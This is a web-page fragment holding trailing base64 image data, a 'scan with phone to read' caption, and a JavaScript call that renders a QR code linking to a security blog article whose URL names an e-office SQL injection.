QkeBlJTqvB8Tre0McyL+kR1UV1UT8y8e+ozrz6iOb3i6Kl16vJZ/SxfvcZIn/30mBfP9MNANC98zQ1MB+L0RKedaN7jy8XU5eJVP/P6n+HdPfVlb/XcQ120LjHr5DNf6sWnA7HZwp+9gcNAakpjeByfDlFdTN0e6vL0m1dPn7qo/8pXfj0ztFd5x9CfeXW95sXU5WL61Ec8DGRMrvXP38DhJ3WPMJumT0nm1bNePf36zMtnqE/UJz/D2Z5Zq88e5h+PXqnra/Wx+89A5Xn8+ah1xR+6QWkV9jnD9YZs1/Uei+0n9ZzW7Hj6zNfEK5KXVpF+fTPUX7UV+tSTq4+op+or5OLorXXqcrE8FdWrIvXk5R0j8/IzXG/I2a28UNu+htTkPxOeeXwSxrX57KkuWiPXL8+8uqi/UE3M2uRVU6G/1hUzn7poXWL1qLjSy5Ox3pC8tRfzbSBO/Qpn53XSmbdf6vrFzCef+exfeLdGX9VU2LvWFXKxtAp5ov3E8lbIxdIqkpdmbAPRtPC1N3AYSE5fPjtm5uVOPOs+q8/6qZ/h1Z7W6PNMqZuf6eZFfYnmxWf5w0AsWviaG/j2gfi0zT4dnw7z6U+uL+vU9ReeaaVnbWkVqc/qy1txlS/PGPoTR0+tPUfhtw8kN1/8czfwbQOpSVfUlCs8Rq0r5ImVGyPz8up9Fme1o1Zre9S6Qj7D8lSYr3WF+9d6jPSZU8869fSV/m0DqWYr/v4GDgNxmomzrfQ57RlXn+Gsv7r9k5/103OWKy3z9q7cGDNf6jOuPkP3GvOHgYzJtf75G9gG4lNyhV89on2tl4v5tMjFrFO3vlDPXayairNepWdkX/Op2089fXJRX+E2kCIrXn8DayCvn8HuBP8BAAD//9cQI74AAAAGSURBVAMAZO0N1JcMIEkAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-webservice-json-user-wsdl-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 